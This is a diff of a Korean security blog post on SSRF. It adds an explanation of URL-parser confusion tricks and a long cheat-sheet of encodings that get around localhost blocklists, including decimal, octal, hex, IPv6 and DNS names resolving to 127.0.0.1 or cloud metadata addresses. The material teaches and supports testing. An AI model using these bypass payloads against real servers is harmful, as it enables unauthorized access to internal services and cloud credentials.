@@ -55,7 +55,7 @@ SSRF 를 활용한 공격 방식은 크게 3가지로 분류할 수 있다.
 
 ## AWS 클라우드 기반 SSRF
 
-💡 **<u>AWS 외에도 GCP, Azre, Digital Ocean등 public cloud를 사용하는 경우 Metadata API 로의 접근을 통해 instance에 대한 정보를 얻거나 중요한 키 값을 얻어 시스템을 탈취할 수 있다.u>** 
+💡 **<u>AWS 외에도 GCP, Azre, Digital Ocean등 public cloud를 사용하는 경우 Metadata API 로의 접근을 통해 instance에 대한 정보를 얻거나 중요한 키 값을 얻어 시스템을 탈취할 수 있다.</u>** 
 {: .notice--primary} 
 
 <div class="notice">
@@ -91,3 +91,112 @@ http://instance-data/latest/meta-data/public-keys/
 
 # Bypass  
 ## URL Parser 의 pasing 방법부터 알아보자.
+
+![그림 1-1](image.png)
+위와 같은 형식으로 URI를 나누어서 해석할 수 있다.
+💡 **<u>각 Parser 마다 pasing 방법이 상이할 수 있다.</u>** 
+{: .notice--primary} 
+보통 아래와 같은 형식으로 우회를 주로 시도한다.
+
+<div class="notice">
+http://attack.com#trust.com<br>
+or<br>
+http://trust.com@attack.com
+</div>
+
+- 위와같이 사용했을 때 # 이전의 url로 접근하는 이유는 일반적으로 
+#은 브라우저에서 사용되는 프래그먼트 식별자이며, 서버로는 전달되지 않기 때문이다. 
+- 또한 @를 쓸 경우 @이후의 url로 접근하는 것은 @는 URL에서 호스트를 구분하는 일반적인 구분문자이다. @다음에 원하는 주소를 사용할 경우 내부 서버에 접근 할 수 있다.  또한 몇몇 취약한 구현방식에서는 @를 호스트 구분 문자로 사용되지 않거나, 충분한 검증이 이루어지지 않을 수 있다.
+
+## Bypass ‘127.0.0.1’ 
+- [localhost](http://localhost) 주소가 BlackList 기반 정책을 통해 필터링 될 때 이를 우회할 수 있다.
+주로 사용하는 loopback 주소를 우회하는 방법은 아주 다양하다.
+크게 나누자면
+1. 127.0.0.1 과 매핑된 도메인 주소 사용
+2. 127.0.0.1 의 alias 사용
+3. localhost의 alias 사용
+
+<div class="notice">
+
+# Localhost<br>
+http://127.0.0.1:80<br>
+http://127.0.0.1:443<br>
+http://127.0.0.1:22<br>
+http://127.1:80<br>
+http://127.000000000000000.1<br>
+http://0<br>
+http:@0/ --> http://localhost/<br>
+http://0.0.0.0:80<br>
+http://localhost:80<br>
+http://[::]:80/<br>
+http://[::]:25/ SMTP<br>
+http://[::]:3128/ Squid<br>
+http://[0000::1]:80/<br>
+http://[0:0:0:0:0:ffff:127.0.0.1]/thefile<br>
+http://①②⑦.⓪.⓪.⓪<br>
+http://vcap.me:8000/<br>
+http://0x7f.0x00.0x00.0x01:8000/<br>
+http://0x7f000001:8000/<br>
+http://2130706433:8000/<br>
+http://Localhost:8000/<br>
+http://127.0.0.255:8000/<br>
+<br>
+
+# CDIR bypass<br>
+http://127.127.127.127<br>
+http://127.0.1.3<br>
+http://127.0.0.0<br>
+<br>
+
+# Dot bypass<br>
+127。0。0。1<br>
+127%E3%80%820%E3%80%820%E3%80%821<br>
+<br>
+
+# Decimal bypass<br>
+http://2130706433/ = http://127.0.0.1<br>
+http://3232235521/ = http://192.168.0.1<br>
+http://3232235777/ = http://192.168.1.1<br>
+<br>
+
+# Octal Bypass<br>
+http://0177.0000.0000.0001<br>
+http://00000177.00000000.00000000.00000001<br>
+http://017700000001<br>
+<br>
+
+# Hexadecimal bypass<br>
+127.0.0.1 = 0x7f 00 00 01<br>
+http://0x7f000001/ = http://127.0.0.1<br>
+http://0xc0a80014/ = http://192.168.0.20<br>
+0x7f.0x00.0x00.0x01<br>
+0x0000007f.0x00000000.0x00000000.0x00000001<br>
+<br>
+
+# Add 0s bypass<br>
+127.000000000000.1<br>
+<br>
+
+# You can also mix different encoding formats<br>
+# https://www.silisoftware.com/tools/ipconverter.php<br>
+<br>
+
+# Malformed and rare<br>
+localhost:+11211aaa<br>
+localhost:00011211aaaa<br>
+http://0/<br>
+http://127.1<br>
+http://127.0.1<br>
+<br>
+
+# DNS to localhost<br>
+localtest.me = 127.0.0.1<br>
+customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1<br>
+mail.ebc.apple.com = 127.0.0.6 (localhost)<br>
+127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)<br>
+www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com<br>
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io<br>
+http://bugbounty.dod.network = 127.0.0.2 (localhost)<br>
+1ynrnhl.xip.io == 169.254.169.254<br>
+spoofed.burpcollaborator.net = 127.0.0.1
+</div>
